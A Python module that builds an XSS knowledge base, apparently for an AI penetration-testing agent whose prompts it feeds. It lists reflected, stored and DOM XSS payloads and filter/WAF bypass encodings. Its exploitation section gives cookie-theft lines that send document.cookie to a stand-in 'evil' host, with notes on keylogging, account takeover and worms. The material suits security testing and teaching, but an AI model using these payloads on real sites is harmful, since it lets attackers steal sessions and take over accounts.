"""XSS deep knowledge base.

Deep knowledge about cross-site scripting:
1. Reflected XSS
2. Stored XSS
3. DOM-based XSS
4. XSS filter bypass
5. XSS exploitation chains
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class XSSPattern:
    """An XSS attack pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


XSS_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "xss-001", "name": "Reflected XSS",
        "category": "reflected", "severity": "high",
        "desc": "Reflected XSS techniques.",
        "detection": (
            "REFLECTED XSS:\n"
            "DETECTION:\n"
            "  - Inject probe: <script>alert(1)</script>\n"
            "  - Check all parameters\n"
            "  - Check URL path segments\n"
            "  - Check headers (Referer, User-Agent)\n"
            "  - Check fragments\n"
            "CONTEXTS:\n"
            "  HTML: <tag>INJECT</tag>\n"
            "  Attribute: <tag attr=\"INJECT\">\n"
            "  JavaScript: var x = 'INJECT'\n"
            "  URL: href=\"INJECT\"\n"
            "  CSS: style=\"INJECT\"\n"
            "PAYLOADS BY CONTEXT:\n"
            "  HTML:\n"
            "    <script>alert(1)</script>\n"
            "    <img src=x onerror=alert(1)>\n"
            "    <svg onload=alert(1)>\n"
            "  Attribute:\n"
            "    \" onmouseover=alert(1) x=\"\n"
            "    \" onfocus=alert(1) autofocus=\"\n"
            "    javascript:alert(1) (in href)\n"
            "  JavaScript:\n"
            "    ';alert(1)//\n"
            "    </script><script>alert(1)</script>\n"
            "  Template:\n"
            "    {{constructor.constructor('alert(1)')()}}\n"
            "    ${alert(1)} (template literal)\n"
            "TOOLS:\n"
            "  XSStrike, dalfox, Burp, kxss"
        ),
        "tools": [],
    },
    {
        "id": "xss-002", "name": "Stored XSS",
        "category": "stored", "severity": "high",
        "desc": "Stored/persistent XSS techniques.",
        "detection": (
            "STORED XSS:\n"
            "INJECTION POINTS:\n"
            "  - User profiles (name, bio, avatar URL)\n"
            "  - Comments and posts\n"
            "  - File upload (SVG, HTML, XML)\n"
            "  - Email subject/body (webmail)\n"
            "  - Product listings\n"
            "  - Chat messages\n"
            "  - Markdown/rich text editors\n"
            "  - URL shorteners\n"
            "  - Error logs (admin view)\n"
            "  - Search history\n"
            "FILE-BASED:\n"
            "  SVG:\n"
            "    <svg xmlns=\"http://www.w3.org/2000/svg\">\n"
            "      <script>alert(1)</script>\n"
            "    </svg>\n"
            "  HTML upload:\n"
            "    <html><script>alert(1)</script></html>\n"
            "  PDF:\n"
            "    PDF with embedded JavaScript\n"
            "SECOND-ORDER:\n"
            "  - Stored in one place, triggers in another\n"
            "  - Database values rendered elsewhere\n"
            "  - Log injection → admin panel XSS\n"
            "TOOLS:\n"
            "  XSStrike, Burp, custom scripts"
        ),
        "tools": [],
    },
    {
        "id": "xss-003", "name": "DOM-based XSS",
        "category": "dom", "severity": "high",
        "desc": "DOM-based XSS techniques.",
        "detection": (
            "DOM-BASED XSS:\n"
            "SOURCES:\n"
            "  - document.URL\n"
            "  - document.documentURI\n"
            "  - document.referrer\n"
            "  - location.href / .search / .hash\n"
            "  - window.name\n"
            "  - postMessage data\n"
            "  - Web Storage (localStorage)\n"
            "  - IndexedDB\n"
            "  - URL parameters\n"
            "SINKS:\n"
            "  EXECUTION:\n"
            "    - eval()\n"
            "    - setTimeout() / setInterval()\n"
            "    - Function()\n"
            "    - document.write()\n"
            "  HTML:\n"
            "    - innerHTML\n"
            "    - outerHTML\n"
            "    - insertAdjacentHTML()\n"
            "    - DOMParser.parseFromString()\n"
            "  URL:\n"
            "    - location = SOURCE\n"
            "    - location.href = SOURCE\n"
            "    - window.open(SOURCE)\n"
            "    - element.src = SOURCE\n"
            "  jQuery:\n"
            "    - $(SOURCE)\n"
            "    - .html(SOURCE)\n"
            "    - .append(SOURCE)\n"
            "DETECTION:\n"
            "  # Analyze JavaScript for source→sink flows\n"
            "  # Dynamic analysis with DOM Invader\n"
            "  # Taint tracking\n"
            "TOOLS:\n"
            "  DOM Invader (Burp), RetireJS, eslint"
        ),
        "tools": [],
    },
    {
        "id": "xss-004", "name": "XSS Filter Bypass",
        "category": "bypass", "severity": "high",
        "desc": "XSS filter/WAF bypass techniques.",
        "detection": (
            "XSS FILTER BYPASS:\n"
            "ENCODING:\n"
            "  - HTML entities: &#x61;lert(1)\n"
            "  - URL encoding: %3Cscript%3E\n"
            "  - Double encoding: %253Cscript%253E\n"
            "  - Unicode: \\u0061lert(1)\n"
            "  - Base64: atob('YWxlcnQoMSk=')\n"
            "  - Hex: \\x61lert(1)\n"
            "  - Octal: \\141lert(1)\n"
            "TAG ALTERNATIVES:\n"
            "  - <svg onload=alert(1)>\n"
            "  - <img src=x onerror=alert(1)>\n"
            "  - <body onload=alert(1)>\n"
            "  - <details open ontoggle=alert(1)>\n"
            "  - <marquee onstart=alert(1)>\n"
            "  - <video><source onerror=alert(1)>\n"
            "  - <math><mtext><style><img src=x onerror=alert(1)>\n"
            "JAVASCRIPT ALTERNATIVES:\n"
            "  - alert`1` (template literal)\n"
            "  - top['al'+'ert'](1)\n"
            "  - window['alert'](1)\n"
            "  - self['alert'](1)\n"
            "  - constructor.constructor('alert(1)')()\n"
            "  - [].constructor.constructor('alert(1)')()\n"
            "WAF BYPASS:\n"
            "  - Case mixing: <ScRiPt>alert(1)</sCrIpT>\n"
            "  - Null bytes: <scr\\0ipt>alert(1)</script>\n"
            "  - Comment insertion: <scr<!---->ipt>\n"
            "  - Content-Type: multipart/form-data\n"
            "TOOLS:\n"
            "  XSStrike, dalfox, Burp, knoxss"
        ),
        "tools": [],
    },
    {
        "id": "xss-005", "name": "XSS Exploitation Chains",
        "category": "exploitation", "severity": "critical",
        "desc": "XSS exploitation and impact.",
        "detection": (
            "XSS EXPLOITATION CHAINS:\n"
            "SESSION HIJACK:\n"
            "  - Cookie theft\n"
            "    # document.cookie → attacker server\n"
            "    # new Image().src='//evil/'+document.cookie\n"
            "    # fetch('//evil/'+document.cookie)\n"
            "  - LocalStorage theft\n"
            "  - Session token extraction\n"
            "ACCOUNT TAKEOVER:\n"
            "  - Password change via XSS\n"
            "    # CSRF + XSS combo\n"
            "    # Submit password change form\n"
            "  - Email change\n"
            "  - API key theft\n"
            "KEYLOGGING:\n"
            "  - Capture keystrokes\n"
            "    # document.onkeypress\n"
            "    # Send to attacker server\n"
            "PHISHING:\n"
            "  - Inject fake login form\n"
            "  - Redirect to phishing page\n"
            "  - Overlay legitimate page\n"
            "WORM:\n"
            "  - Self-propagating XSS\n"
            "  - Store payload + replicate\n"
            "  - MySpace Samy worm pattern\n"
            "ADVANCED:\n"
            "  - XSS → SSRF (via browser)\n"
            "  - XSS → RCE (Electron apps)\n"
            "  - XSS → OAuth token theft\n"
            "  - XSS in admin panel → full control\n"
            "TOOLS:\n"
            "  BeEF, XSSHunter, custom JS payloads"
        ),
        "tools": [],
    },
]


class XSSDeepKB:
    """XSS deep knowledge base.

    Provides XSS patterns injected
    into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, XSSPattern] = {}
        self._log = logger.bind(component="xss_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load XSS patterns."""
        for data in XSS_PATTERNS:
            pattern = XSSPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[XSSPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_xss_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build XSS prompt."""
        lines = ["## XSS Attacks\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
